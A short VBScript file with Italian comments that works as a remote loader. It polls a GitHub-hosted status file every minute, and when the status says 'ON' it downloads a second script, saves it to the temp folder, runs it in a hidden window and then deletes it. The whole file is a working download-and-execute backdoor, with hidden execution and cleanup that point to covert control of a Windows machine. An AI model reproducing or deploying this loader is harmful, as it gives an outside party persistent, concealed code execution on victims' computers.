Option Explicit
On Error Resume Next

Dim shell, fso, xmlHttp
Dim urlStatus, urlPayload
Dim statusContent, payloadContent
Dim tempScriptPath, fileTemp

' --- CONFIGURAZIONE URL ---
' Questi URL puntano ai file nel tuo repository mostrato nell'immagine
urlStatus  = "https://raw.githubusercontent.com/StangaSquola/RemoteScript/main/status.txt"
urlPayload = "https://raw.githubusercontent.com/StangaSquola/RemoteScript/main/script.txt"

Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
Set xmlHttp = CreateObject("MSXML2.ServerXMLHTTP.6.0")

' --- LOOP DI CONTROLLO ---
Do
    ' 1. Scarica lo stato (status.txt)
    xmlHttp.Open "GET", urlStatus, False
    ' Intestazione per evitare che la cache del server/proxy ti dia dati vecchi
    xmlHttp.SetRequestHeader "If-Modified-Since", "Sat, 1 Jan 2000 00:00:00 GMT"
    xmlHttp.Send

    If xmlHttp.Status = 200 Then
        ' Pulisce la risposta da spazi e ritorni a capo
        statusContent = UCase(Trim(xmlHttp.responseText))
        statusContent = Replace(statusContent, vbCr, "")
        statusContent = Replace(statusContent, vbLf, "")
        
        ' 2. Se lo stato è "ON", scarica ed esegue il payload (script.txt)
        If InStr(statusContent, "ON") > 0 Then
            
            ' Scarica il contenuto dello script da eseguire
            xmlHttp.Open "GET", urlPayload, False
            xmlHttp.SetRequestHeader "If-Modified-Since", "Sat, 1 Jan 2000 00:00:00 GMT"
            xmlHttp.Send
            
            If xmlHttp.Status = 200 Then
                payloadContent = xmlHttp.responseText
                
                ' Definisce un percorso temporaneo per lo script dinamico
                tempScriptPath = shell.ExpandEnvironmentStrings("%TEMP%") & "\task_remoto.vbs"
                
                ' Salva il contenuto scaricato in un file .vbs
                Set fileTemp = fso.CreateTextFile(tempScriptPath, True)
                fileTemp.Write payloadContent
                fileTemp.Close
                
                ' Esegue il nuovo script scaricato
                ' Il parametro ,0,True significa: nascosto e attendi che finisca
                shell.Run "wscript.exe """ & tempScriptPath & """", 0, True
                
                ' Opzionale: Cancella lo script dopo l'esecuzione per pulizia
                If fso.FileExists(tempScriptPath) Then fso.DeleteFile tempScriptPath
            End If
        End If
    End If

    ' 3. Attesa di 60 secondi prima del prossimo controllo
    WScript.Sleep 60000
Loop
